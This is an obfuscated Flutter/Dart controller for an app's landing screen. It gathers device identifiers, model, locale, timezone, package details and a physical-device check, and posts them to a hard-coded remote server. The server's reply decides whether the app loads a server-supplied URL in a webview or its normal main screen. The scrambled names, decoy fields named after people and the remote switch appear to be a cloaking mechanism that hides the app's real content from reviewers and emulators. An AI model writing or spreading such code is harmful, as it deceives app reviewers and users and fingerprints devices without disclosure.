import 'dart:io';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';

import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:get/get.dart';



class CproLandLogic extends GetxController {

  var ngkqwx = RxBool(false);
  var gblitzx = RxBool(true);
  var tkwviqr = RxString("");
  var rita = RxBool(false);
  var olson = RxBool(true);
  final qlspdut = Dio();


  InAppWebViewController? webViewController;

  dynamic vjpcfuson(){
    final ptqoafxvzr = InternetConnectionChecker.instance;
    final ycklapbe = ptqoafxvzr.onStatusChange.skip(1).listen(
          (InternetConnectionStatus ogsvlwak) {
        if (ogsvlwak == InternetConnectionStatus.connected) {
          etxs();
        } else {
          Get.toNamed('/cpro_mode')?.then((_){
            etxs();
          });
        }
      },
    );
    return ycklapbe;
  }

  Future<bool> fncxsp() async {
    var dizqmbvpe = await InternetConnectionChecker.instance.hasConnection;
    if(!dizqmbvpe){
      Get.toNamed('/cpro_mode')?.then((_){
        etxs();
      });
    }
    return dizqmbvpe;
  }

  @override
  void onInit() {
    super.onInit();
    vjpcfuson();
    etxs();
  }


  Future<void> etxs() async {

    var gcskohawi = await fncxsp();
    if(!gcskohawi){
      return;
    }

    rita.value = true;
    olson.value = true;
    gblitzx.value = false;

    qlspdut.post("https://alone.twistebe.com/VVOZ3DVSDXVTA28",data: await ehatdwxs()).then((value) {
      var fesrvz = value.data["fesrvz"] as String;
      var hcnsz = value.data["hcnsz"] as bool;
      if (hcnsz) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        tkwviqr.value = fesrvz;
        marina();
      } else {
        koch();
      }
    }).catchError((e) {
      gblitzx.value = true;
      olson.value = true;
      rita.value = false;
    });
  }

  Future<Map<String, dynamic>> ehatdwxs() async {
    final DeviceInfoPlugin jnukldmp = DeviceInfoPlugin();
    PackageInfo rjulkm_rdly = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var jwesr = Platform.localeName;
    var yxwkonea = currentTimeZone;

    var kovb = rjulkm_rdly.packageName;
    var jesnrx = rjulkm_rdly.version;
    var inglah = rjulkm_rdly.buildNumber;

    var yngdv = rjulkm_rdly.appName;
    var ivrnwkt = "";
    var ozseycbv  = "";
    var ckhpm = "";
    var leonieTurner = "";
    var monicaVon = "";
    var jeromeEmmerich = "";
    var chesterMueller = "";
    var robertMcLaughlin = "";
    var danJones = "";


    var dxkpe = "";
    var mozqyu = false;

    if (GetPlatform.isAndroid) {
      dxkpe = "android";
      var fiqmlbuxo = await jnukldmp.androidInfo;

      ckhpm = fiqmlbuxo.brand;

      ivrnwkt  = fiqmlbuxo.model;
      ozseycbv = fiqmlbuxo.id;

      mozqyu = fiqmlbuxo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dxkpe = "ios";
      var mhcyezdnv = await jnukldmp.iosInfo;
      ckhpm = mhcyezdnv.name;
      ivrnwkt = mhcyezdnv.model;

      ozseycbv = mhcyezdnv.identifierForVendor ?? "";
      mozqyu  = mhcyezdnv.isPhysicalDevice;
    }

    var res = {
      "inglah": inglah,
      "jesnrx": jesnrx,
      "kovb": kovb,
      "jeromeEmmerich" : jeromeEmmerich,
      "ivrnwkt": ivrnwkt,
      "monicaVon" : monicaVon,
      "ckhpm": ckhpm,
      "robertMcLaughlin" : robertMcLaughlin,
      "ozseycbv": ozseycbv,
      "jwesr": jwesr,
      "dxkpe": dxkpe,
      "danJones" : danJones,
      "mozqyu": mozqyu,
      "leonieTurner" : leonieTurner,
      "chesterMueller" : chesterMueller,

      "yngdv": yngdv,
      "yxwkonea": yxwkonea,
    };
    return res;
  }

  Future<void> koch() async {
    Get.offNamed("/cpro_main");
  }

  Future<void> marina() async {
    Get.offNamed("/cpro_slider");
  }

  @override
  void dispose() {
    vjpcfuson().cancel();
    super.dispose();
  }

}
